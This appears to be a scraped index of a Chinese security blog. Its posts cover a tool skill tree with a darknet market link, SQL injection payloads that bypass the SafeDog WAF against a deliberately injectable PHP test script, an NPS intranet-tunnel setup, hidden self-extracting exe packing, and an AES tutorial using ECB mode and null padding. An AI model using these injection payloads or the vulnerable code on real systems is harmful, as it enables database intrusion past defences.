","date":"2021-01-01","objectID":"/20210101/:9:18","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://brew.sh/ ","date":"2021-01-01","objectID":"/20210101/:9:19","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Linux ","date":"2021-01-01","objectID":"/20210101/:9:20","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Bash ","date":"2021-01-01","objectID":"/20210101/:9:21","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/jlevy/the-art-of-command-line ","date":"2021-01-01","objectID":"/20210101/:9:22","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/Idnan/bash-guide ","date":"2021-01-01","objectID":"/20210101/:9:23","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"tmux/screen/grep/zgrep/awk/sed/cut/find/du/df/dd/ls/cat/cd/pwd/id/free/ps/netstat/vmstat/top/crontab/tree/tail/head/vi/ifconfig/lsof/dig/mount/strings/uname/echo/history/tar/unzip/gzip/zip/diff/md5sum/file/base64/rm/mv/gcc/kill/chown/chmod/last/whoami/strace/ltrace/iptables/nohup/nc/scp/ssh/telnet ","date":"2021-01-01","objectID":"/20210101/:9:24","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"隔离 ","date":"2021-01-01","objectID":"/20210101/:9:25","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"VMware ","date":"2021-01-01","objectID":"/20210101/:9:26","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"VirtualBox ","date":"2021-01-01","objectID":"/20210101/:9:27","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"ParallelsDesktop ","date":"2021-01-01","objectID":"/20210101/:9:28","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Docker ","date":"2021-01-01","objectID":"/20210101/:9:29","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"翻墙 ","date":"2021-01-01","objectID":"/20210101/:9:30","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/shadowsocks ","date":"2021-01-01","objectID":"/20210101/:9:31","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"proxychains ","date":"2021-01-01","objectID":"/20210101/:9:32","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"暗网 ","date":"2021-01-01","objectID":"/20210101/:9:33","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://alphabaymarket.com/ ","date":"2021-01-01","objectID":"/20210101/:9:34","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"硬件 ","date":"2021-01-01","objectID":"/20210101/:9:35","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"iPhone+iPad+Mac ","date":"2021-01-01","objectID":"/20210101/:9:36","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"ThinkPad ","date":"2021-01-01","objectID":"/20210101/:9:37","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"云服务 ","date":"2021-01-01","objectID":"/20210101/:9:38","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"VPS ","date":"2021-01-01","objectID":"/20210101/:9:39","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"AWS ","date":"2021-01-01","objectID":"/20210101/:9:40","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Linode ","date":"2021-01-01","objectID":"/20210101/:9:41","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Vultr ","date":"2021-01-01","objectID":"/20210101/:9:42","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"DigitalOcean ","date":"2021-01-01","objectID":"/20210101/:9:43","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Dropbox ","date":"2021-01-01","objectID":"/20210101/:9:44","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"OneDrive ","date":"2021-01-01","objectID":"/20210101/:9:45","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"GoogleDocs ","date":"2021-01-01","objectID":"/20210101/:9:46","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Email ","date":"2021-01-01","objectID":"/20210101/:9:47","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Gmail ","date":"2021-01-01","objectID":"/20210101/:9:48","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Outlook ","date":"2021-01-01","objectID":"/20210101/:9:49","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"ProtonMail ","date":"2021-01-01","objectID":"/20210101/:9:50","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"安全 ","date":"2021-01-01","objectID":"/20210101/:9:51","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"GPG ","date":"2021-01-01","objectID":"/20210101/:9:52","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://gnupg.org/download/index.html ","date":"2021-01-01","objectID":"/20210101/:9:53","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"TrueCrypt ","date":"2021-01-01","objectID":"/20210101/:9:54","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"情报跟进 ","date":"2021-01-01","objectID":"/20210101/:9:55","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Inoreader ","date":"2021-01-01","objectID":"/20210101/:9:56","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Twitter ","date":"2021-01-01","objectID":"/20210101/:9:57","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"说明 ","date":"2021-01-01","objectID":"/20210101/:10:0","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"V1By@余弦201709 ","date":"2021-01-01","objectID":"/20210101/:10:1","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"联系我：evilcos@gmail.com ","date":"2021-01-01","objectID":"/20210101/:10:2","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"更新动态关注微信公众号：懒人在思考 ","date":"2021-01-01","objectID":"/20210101/:10:3","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"工欲善其事必先利其器 ","date":"2021-01-01","objectID":"/20210101/:10:4","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"世界之大总有一款利器适合你 ","date":"2021-01-01","objectID":"/20210101/:10:5","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/Hack-with-Github/Awesome-Hacking ","date":"2021-01-01","objectID":"/20210101/:10:6","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"特别说明 ","date":"2021-01-01","objectID":"/20210101/:10:7","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"这份技能树最适合走向安全工程化之路的人 ","date":"2021-01-01","objectID":"/20210101/:10:8","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"这份技能树以利器为主要出发点进行梳理 ","date":"2021-01-01","objectID":"/20210101/:10:9","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"应该叫“余弦的安全技能树简版”更合适","date":"2021-01-01","objectID":"/20210101/:10:10","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["技术"],"content":"攻击的特定: 攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品: ","date":"2020-12-01","objectID":"/20201201/:0:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 ","date":"2020-12-01","objectID":"/20201201/:1:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"软件产品类 安全狗 云锁 360主机卫士 ModSecurity ","date":"2020-12-01","objectID":"/20201201/:2:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"硬件类型设备: 启明星辰 绿盟 天融信 飞塔等 硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过 WAF的核心原理: 运用黑白思想 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞 对匹配结果进行响应(拦截,记录) WAF的几种部署模式: ","date":"2020-12-01","objectID":"/20201201/:3:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"基于DNS解析 修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器 ","date":"2020-12-01","objectID":"/20201201/:4:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"串联模式 一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署. ","date":"2020-12-01","objectID":"/20201201/:5:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"旁路模式 利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断. ","date":"2020-12-01","objectID":"/20201201/:6:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"软件嵌入中间件+检测引擎模式 在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务 WAF为什么会被绕过: 鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作 WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性 硬件WAF自身往往存在漏洞 架构:waf部署模式 规则缺陷/特性 协议:指HTTP0.9协议:TCP长连接 WAF绕过实战—-绕过安全狗进行注入 所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护 ","date":"2020-12-01","objectID":"/20201201/:7:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"实验环境: 环境:安全狗Apache最新版 本地测试代码(PHP): $id = $_GET['id']; $con = mysql_connect(\"localhost\",\"root\",\"root\"); if (!$con){die('Could not connect: ' . mysql_error());} mysql_select_db(\"dvwa\", $con); $query = \"SELECT first_name,last_name FROM users WHERE user_id = '$id'; \"; $result = mysql_query($query)or die('\u003cpre\u003e'.mysql_error().'\u003c/pre\u003e'); while($row = mysql_fetch_array($result)) { echo $row['0'] . \"\u0026nbsp\" . $row['1']; echo \"\u003cbr /\u003e\";}echo \"\u003cbr/\u003e\";echo $query; mysql_close($con); ","date":"2020-12-01","objectID":"/20201201/:8:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"绕过拦截and 1=1 首先先稍微测试一番,发现存在安全狗 http://127.0.0.1/test.php?id=1 and 1=1%23 and 1 拦截 and '1' 拦截 and a 不拦截 and 'a' 拦截 and ! 不拦截 and 1+1 拦截 and 1+a 拦截 and hex(1) 不拦截 通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路 用其他字符替换 and 或者 or 带入的不是字符串和数字型，带入一个特殊符号 针对第一种我们可以去看看运算符号 随便找到几个| ^ xor \u0026 / * \u0026\u0026 || 等等还有很多 与运算 a \u0026 b , 或运算 a | b , 异或运算 a ^ b 那么可以试着将and替换成\u0026\u0026,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过 http://127.0.0.1/test.php?id=1' %26%26 true%23 另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持\u0026\u0026 || ,oracle不支持 \u0026\u0026 ||） http://127.0.0.1/test.php?id=1' || true%23 //将and 1=1替换为|| true,也可以绕过安全狗 http://127.0.0.1/test.php?id=1' ||(1) %23 //使用括号代替空格绕过 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1） http://127.0.0.1/test.php?id=1' xor 1%23 http://127.0.0.1/test.php?id=1' xor true%23 ","date":"2020-12-01","objectID":"/20201201/:9:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"绕过order by查询 判断查询字段,使用mysql的/*!*/内敛注释去绕过防护,而其中的代码是可以正常执行的 http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23 ","date":"2020-12-01","objectID":"/20201201/:10:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"绕过union select查询 使用union xxx页面正常 但是用union和select放在在一起就被发现啦 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过 http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+ 对于数字型注入,可以将其转换成浮点型 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过, 函数中可以插入任何混淆字符绕过waf 另外使用-1可以省去空格绕过waf http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23 基于报错信息的注入绕安全狗 http://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23 http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23 ","date":"2020-12-01","objectID":"/20201201/:11:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"绕过select from 使用大括号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables} 使用反引号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables` 使用\\N去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\\Nfrom information_schema.tables 括号法去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables))) 也可以组合起来 http://127.0.0.1/test.php?id=1.0/*union/*!select-1*/,2,3,4\\Nfrom{a`information_schema`.tables} 这些都是去掉空格的合法语句,当然如果不拦截/*/或/!*/的话,也可以尝试这两个 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。 补充点 php+mysql环境下支持的空格有： %0a,%0b,%0c,%0d,%20,%09,%a0,/**/ 其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。 干货分享：使用/^!$asd%2a–=/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*/换成/^!$asd%2a–=*/即可使用sqlmap跑了。 ","date":"2020-12-01","objectID":"/20201201/:12:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["技术"],"content":"缓冲区溢出绕waf 另外也可以对安全狗实行缓冲区溢出绕waf 缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过 要求是(针对于安全狗而已): GET类型请求转换成POST类型 Content-Length头长度大于4008 正常参数放置在脏数据后面 ","date":"2020-12-01","objectID":"/20201201/:13:0","tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/20201201/"},{"categories":["教程"],"content":"NPS内网穿透配置NPS ","date":"2020-11-01","objectID":"/20201101/:0:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"github项目地址 https://github.com/cnlh/nps ","date":"2020-11-01","objectID":"/20201101/:1:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"原理 ","date":"2020-11-01","objectID":"/20201101/:2:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"服务器端配置 准备工作 一台拥有公网IP的VPS 安装nps软件包 wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_server.tar.gz tar -zxvf linux_amd64_server.tar.gz cd nps/ ./nps start 配置server端 在安装完成，启动nps后，便可访问server_IP:8080来访问nps配置dashboard了 要求登陆，默认的用户名：admin，密码：123 网页dashboard的用户名和密码可在nps/conf/nps.conf配置文件中的web模块中修改 登陆进入dashboard后,看到界面，默认客户端为0（这里我已经创建了一个） 默认的客户端链接端口为8024（该端口为客户端用于链接服务器的端口，来保持链接，原理与反向代理相似） 新建客户端 这里我们创建一个新的客户端， 这里的客户端只是在server配置的客户端，之后使用客户端软件链接，所以要与客户端配置一致 创建好的客户端是这样的，status为offline，因为客户端还没链接 这里server会自动随机生成一个vkey=7oswclqe5knqu15x（之后配置客户端会使用） ","date":"2020-11-01","objectID":"/20201101/:3:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"客户端配置 Windows 下载客户端 https://github.com/cnlh/nps/releases/download/v0.23.1/win_amd64_client.tar.gz 这里使用windows作为客户端 下载解压后配置vps.conf， 将其他配置删除，只保留如图所示的配置 修改 server_addr为VPS的公网ip和dashboard的默认客户端链接端口 vkey为server网页上新建的客户端生成的vkey server_addr=server_IP:8024 conn_type=tcp vkey=7oswclqe5knqu15x auto_reconnection=true max_conn=1000 flow_limit=1000 rate_limit=1000 basic_username=11 basic_password=3 web_username=user web_password=123 crypt=true compress=true 修改完配置文件后运行nsp.exe，显示成功链接 ","date":"2020-11-01","objectID":"/20201101/:4:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"CentOS wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_client.tar.gz tar -zxvf linux_amd64_client.tar.gz cd npc/ ./npc -server=66.42.81.9:8024 -vkey=7oswclqe5knqu15x -type=tcp 链接成功 两者链接成功后server端中客户端status转为online ","date":"2020-11-01","objectID":"/20201101/:5:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":"使用测试 创建tcp tunnel 这里使用内网router配置网页做测试 点击tunnel创建tcp隧道 点击新增 这里我的router内网ip为192.168.1.1 创建完成 访问测试 访问server_ip:10001 成功访问到内网router配置网页 中文文档： https://github.com/ehang-io/nps/blob/master/README_zh.md ","date":"2020-11-01","objectID":"/20201101/:6:0","tags":["内网穿透"],"title":"NPS内网穿透配置","uri":"/20201101/"},{"categories":["教程"],"content":" 在线抠图：https://www.remove.bg png转ico：https://www.easyicon.net/covert ","date":"2020-10-01","objectID":"/20201001/:0:0","tags":["打包"],"title":"使用好压打包成单个exe文件","uri":"/20201001/"},{"categories":["教程"],"content":"准备 准备个压缩软件，例如好压，WinRAR等等，根据文字举一反三即可 这是将要打包的主目录文件 exe在哪里就复制哪里的相对路径，以主文件目录为准，一定要相对路径，否则移动到别的地方会无法使用 \\Program\\Thunder.exe ","date":"2020-10-01","objectID":"/20201001/:1:0","tags":["打包"],"title":"使用好压打包成单个exe文件","uri":"/20201001/"},{"categories":["教程"],"content":"打包exe 选择-压缩文件格式 勾选-创建自解压格式 点击-自解压选项 选项卡选择-解压 解压后运行-输入相对路径 \\Program\\Thunder.exe 强调下，一定要相对路径否则移动到别处会无法使用 选项卡选择-模式 勾选-解包到临时文件夹 选择-全部隐藏 选项卡选择-更新 解压并替换文件 覆盖所有文件 选项卡选择-图标 浏览选择绝对路径的ico图标文件 ","date":"2020-10-01","objectID":"/20201001/:2:0","tags":["打包"],"title":"使用好压打包成单个exe文件","uri":"/20201001/"},{"categories":["教程"],"content":"完成 打包好后删除了主文件只保留exe文件后移动到别处也可以使用 ","date":"2020-10-01","objectID":"/20201001/:3:0","tags":["打包"],"title":"使用好压打包成单个exe文件","uri":"/20201001/"},{"categories":["教程"],"content":"国际版 国际版就是微软官网那些都是国际版的，速度比世纪互联版差，有些地方需要梯子，敏感东西不会被和谐。 ","date":"2020-09-01","objectID":"/20200901/:1:0","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["教程"],"content":"Microsoft OneDrive ","date":"2020-09-01","objectID":"/20200901/:1:1","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["教程"],"content":"Microsoft Azure 世纪互联版 世纪互联版，只能企业注册，无法个人注册，速度很快，都不需要梯子，有些敏感东西会被和谐。 ","date":"2020-09-01","objectID":"/20200901/:1:2","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["教程"],"content":"Microsoft OneDrive ","date":"2020-09-01","objectID":"/20200901/:1:3","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["教程"],"content":"Microsoft Azure ","date":"2020-09-01","objectID":"/20200901/:1:4","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["教程"],"content":"获取ID和Key ","date":"2020-09-01","objectID":"/20200901/:2:0","tags":["OneDrive"],"title":"搭建OneDrive云盘","uri":"/20200901/"},{"categories":["系统"],"content":"禁用 bcdedit /set hypervisorlaunchtype off ","date":"2017-08-01","objectID":"/20170801/:1:0","tags":["Win10"],"title":"Hyper-V开启关闭","uri":"/20170801/"},{"categories":["系统"],"content":"开启 bcdedit /set hypervisorlaunchtype auto ","date":"2017-08-01","objectID":"/20170801/:2:0","tags":["Win10"],"title":"Hyper-V开启关闭","uri":"/20170801/"},{"categories":["编程"],"content":" 转载自：https://blog.csdn.net/chouzhou9701/article/details/89339625 前言 这几天研究了一下 python 实现 AES 加密，有很多坑 AES 加密的参数及其条件 这个 AES 加密的主要坑就在于这些条件， 首先 aes 加密有一下几个参数 秘钥：加密的时候用秘钥，解密的时候需要同样的秘钥才能解出来 明文：需要加密的参数 模式：aes 加密常用的有 ECB 和 CBC 模式（我只用了这两个模式，还有其他模式） iv 偏移量：这个参数在 ECB 模式下不需要，在 CBC 模式下需要 需要输入这些参数才能返回一个密文 下面是重点 下面说一下这几个参数的条件： 秘钥：必须是16位字节或者24位字节或者32位字节（因为python3的字符串是unicode编码，需要 encode才可以转换成字节型数据） 明文：字节长度需要是16位的倍数 下面我用python3简单的方法实现: ","date":"2017-07-01","objectID":"/20170701/:0:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"简单方法 from Crypto.Cipher import AES import base64 password = '1234567890123456' #秘钥 text = '1234567890123456' #需要加密的内容 model = AES.MODE_ECB #定义模式 aes = AES.new(password,model) #创建一个aes对象 en_text = aes.encrypt(text) #加密明文 print(en_text) en_text = base64.encodebytes(en_text) #将返回的字节型数据转进行base64编码 print(en_text) en_text = en_text.decode('utf8') #将字节型数据转换成python中的字符串类型 print(en_text.strip()) ","date":"2017-07-01","objectID":"/20170701/:1:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"输出 b'u|\\xcd\\x0c\\xdc\\\\\\x90\\xea\\xdb\\xee\\xec\\xf68\\xdd\\x00\\x00' b'dXzNDNxckOrb7uz2ON0AAA==\\n' dXzNDNxckOrb7uz2ON0AAA== 这里有个问题就是密钥和加密的文本内容都必须是固定的16位（根据我前面说的参数要求） 所以下面优化的代码（将秘钥和需要加密的文本补成对应的位数） ","date":"2017-07-01","objectID":"/20170701/:2:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"优化的代码 from Crypto.Cipher import AES import base64 def add_to_16(par): par = par.encode() #先将字符串类型数据转换成字节型数据 while len(par) % 16 != 0: #对字节型数据进行长度判断 par += b'\\x00' #如果字节型数据长度不是16倍整数就进行 补充 return par password = '123456' #秘钥 text = '1' #需要加密的内容 model = AES.MODE_ECB #定义模式 aes = AES.new(add_to_16(password),model) #创建一个aes对象 en_text = aes.encrypt(add_to_16(text)) #加密明文 print(en_text) en_text = base64.encodebytes(en_text) #将返回的字节型数据转进行base64编码 print(en_text) en_text = en_text.decode('utf8') #将字节型数据转换成python中的字符串类型 print(en_text.strip()) 这里简单的说一下几个存在的问题 其实上述代码我简单省略的进行补全到16位，而秘钥24位也是可以的，你可以自己写一个函数来进行秘钥的补全 为什么进行补全之前先进行 .encode() ? 首先 encode() 不加参数默认是以 utf8 编码的，另外先进行 encode 的原因是因为怕加密的文本中存在汉字，而汉字的 utf8 编码的字节长度是3（gbk对汉字的编码字节长度是2），所以为了防止补全的位数不正确，这里必须先进行转换（我看到很多别的文章先补全后进行转换的，而且还是拿空格补全的。。。） 不知道有没有发现，aes.encrypt() 在第一个程序中我传递的是字符串类型，第二个程序传递的是字节型数据，这个函数其实是既可以传递字符串数据类型也可以传递字节型数据的 上面的程序没有解密函数，所以我对整个加密解密进行了一个类的最终封装 ","date":"2017-07-01","objectID":"/20170701/:3:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"最终封装 from Crypto.Cipher import AES import base64 class aescrypt(): def __init__(self,key,model,iv,encode_): self.encode_ = encode_ self.model = {'ECB':AES.MODE_ECB,'CBC':AES.MODE_CBC}[model] self.key = self.add_16(key) if model == 'ECB': self.aes = AES.new(self.key,self.model) #创建一个aes对象 elif model == 'CBC': self.aes = AES.new(self.key,self.model,iv) #创建一个aes对象 #这里的密钥长度必须是16、24或32，目前16位的就够用了 def add_16(self,par): par = par.encode(self.encode_) while len(par) % 16 != 0: par += b'\\x00' return par def aesencrypt(self,text): text = self.add_16(text) self.encrypt_text = self.aes.encrypt(text) return base64.encodebytes(self.encrypt_text).decode().strip() def aesdecrypt(self,text): text = base64.decodebytes(text.encode(self.encode_)) self.decrypt_text = self.aes.decrypt(text) return self.decrypt_text.decode(self.encode_).strip('\\0') if __name__ == '__main__': pr = aescrypt('12345','ECB','','gbk') en_text = pr.aesencrypt('好好学习') print('密文:',en_text) print('明文:',pr.aesdecrypt(en_text)) 时隔多天, 我终于用上了以上的代码然后我发现我的代码是错误的,评论区也有指出 所以我又重新测试发现在ECB模式是没有问题的, 在使用CBC 模式的条件下, 不可以在类的构造函数里面构建 aes对象, 也就是说在CBC模式下 每一次加密和解密 都需要重新构建aes对象 self.aes = AES.new(self.key,self.model,iv), 否则加密和解密的结果就会不一致或者报错 另外就是关于 padding模式方面的问题 ZeroPadding PKCS7Padding PKCS5Padding 这几种模式的区别, 我也不从算法方面探讨了, 因为我发现当你用什么补全的时候, 解密回来的字符串里是包含补全使用的字符串的所以代码中用'\\x00' 补全是没有问题的, 你用什么补全都可以(这里我用的是python,至于别的语言是不是这样我就不知道了) 最后一个点就是 关于base64编码的问题了,我也不知道这个是不是由于padding 模式区别导致的, 因为有的密文采用的是base64编码, 有点密文采用的是 hexstr编码, 反正无论采用什么编码,在真正加密和解密的时候是绝对会转换成 bytes类型的 所以我最终只做一个只是针对 bytes 的AES加密解密类 ","date":"2017-07-01","objectID":"/20170701/:4:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"加密解密类 from Crypto.Cipher import AES import base64 class Aescrypt(): def __init__(self,key,model,iv): self.key = self.add_16(key) self.model = model self.iv = iv def add_16(self,par): if type(par) == str: par = par.encode() while len(par) % 16 != 0: par += b'\\x00' return par def aesencrypt(self,text): text = self.add_16(text) if self.model == AES.MODE_CBC: self.aes = AES.new(self.key,self.model,self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key,self.model) self.encrypt_text = self.aes.encrypt(text) return self.encrypt_text def aesdecrypt(self,text): if self.model == AES.MODE_CBC: self.aes = AES.new(self.key,self.model,self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key,self.model) self.decrypt_text = self.aes.decrypt(text) self.decrypt_text = self.decrypt_text.strip(b\"\\x00\") return self.decrypt_text if __name__ == '__main__': passwd = \"123456781234567\" iv = '1234567812345678' aescryptor = Aescrypt(passwd,AES.MODE_CBC,iv) # CBC模式 # aescryptor = Aescrypt(passwd,AES.MODE_ECB,\"\") # ECB模式 text = \"好好学习\" en_text = aescryptor.aesencrypt(text) print(\"密文:\",en_text) text = aescryptor.aesdecrypt(en_text) print(\"明文:\",text) 上面这段代码 你输入的 所有参数都应该是字符串或者 字节型数据, 并且输出的都是 字节型数据 如果进行一些编码转换可以在类的外部进行完成, 